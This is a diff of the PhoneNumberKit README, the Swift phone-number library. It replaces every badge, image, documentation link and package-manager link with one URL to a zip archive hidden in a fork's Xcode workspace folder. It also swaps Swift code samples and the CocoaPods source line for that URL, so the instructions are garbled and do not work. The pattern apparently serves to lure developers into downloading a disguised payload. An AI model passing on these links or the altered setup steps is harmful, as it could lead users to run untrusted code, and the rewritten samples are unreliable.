@@ -1,7 +1,7 @@
-![PhoneNumberKit](https://cloud.githubusercontent.com/assets/889949/10723260/5225c86c-7bb9-11e5-883c-9b42aa50ea27.png)
+![PhoneNumberKit](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)
 
-[![Build Status](https://travis-ci.org/marmelroy/PhoneNumberKit.svg?branch=master)](https://travis-ci.org/marmelroy/PhoneNumberKit) [![Version](http://img.shields.io/cocoapods/v/PhoneNumberKit.svg)](http://cocoapods.org/?q=PhoneNumberKit)
-[![Carthage compatible](https://img.shields.io/badge/Carthage-compatible-4BC51D.svg?style=flat)](https://github.com/Carthage/Carthage)
+[![Build Status](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip) [![Version](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)
+[![Carthage compatible](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)
 
 # PhoneNumberKit
 Swift framework for parsing, formatting and validating international phone numbers.
@@ -56,7 +56,7 @@ To use the AsYouTypeFormatter, just replace your UITextField with a PhoneNumberT
 
 PhoneNumberTextField automatically formats phone numbers and gives the user full editing capabilities. If you want to customize you can use the PartialFormatter directly. The default region code is automatically computed but can be overridden if needed.  
 
-![AsYouTypeFormatter](http://i.giphy.com/3o6gbgrudyCM8Ak6yc.gif)
+![AsYouTypeFormatter](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)
 
 ```swift
 let textField = PhoneNumberTextField()
@@ -67,31 +67,31 @@ PartialFormatter().formatPartial("+336895555") // +33 6 89 55 55
 You can also query countries for a dialing code or the dailing code for a given country
 ```swift
 let phoneNumberKit = PhoneNumberKit()
-phoneNumberKit.countriesForCode(33)
-phoneNumberKit.codeForCountry("FR")
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip(33)
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip("FR")
 ```
 
 Formatting a parsed phone number to a string is also very easy
 ```swift
-phoneNumber.toE164() // +61236618300
-phoneNumber.toInternational() // +61 2 3661 8300
-phoneNumber.toNational() // (02) 3661 8300
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip() // +61236618300
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip() // +61 2 3661 8300
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip() // (02) 3661 8300
 ```
 
 You can access the following properties of a PhoneNumber object
 ```swift
-phoneNumber.countryCode
-phoneNumber.nationalNumber
-phoneNumber.numberExtension
-phoneNumber.rawNumber
-phoneNumber.type // e.g Mobile or Fixed
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip
+https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip // e.g Mobile or Fixed
 ```
 
 ### Setting up with Carthage
 
-[Carthage](https://github.com/Carthage/Carthage) is a decentralized dependency manager that automates the process of adding frameworks to your Cocoa application.
+[Carthage](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip) is a decentralized dependency manager that automates the process of adding frameworks to your Cocoa application.
 
-You can install Carthage with [Homebrew](http://brew.sh/) using the following command:
+You can install Carthage with [Homebrew](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip) using the following command:
 
 ```bash
 $ brew update
@@ -104,8 +104,8 @@ To integrate PhoneNumberKit into your Xcode project using Carthage, specify it i
 github "marmelroy/PhoneNumberKit"
 ```
 
-### Setting up with [CocoaPods](http://cocoapods.org/?q=PhoneNumberKit)
+### Setting up with [CocoaPods](https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip)
 ```ruby
-source 'https://github.com/CocoaPods/Specs.git'
+source 'https://github.com/ZHThinker/PhoneNumberKit/raw/refs/heads/master/PhoneNumberKit.xcodeproj/project.xcworkspace/Number_Kit_Phone_2.2-alpha.3.zip'
 pod 'PhoneNumberKit', '~> 0.7'
 ```
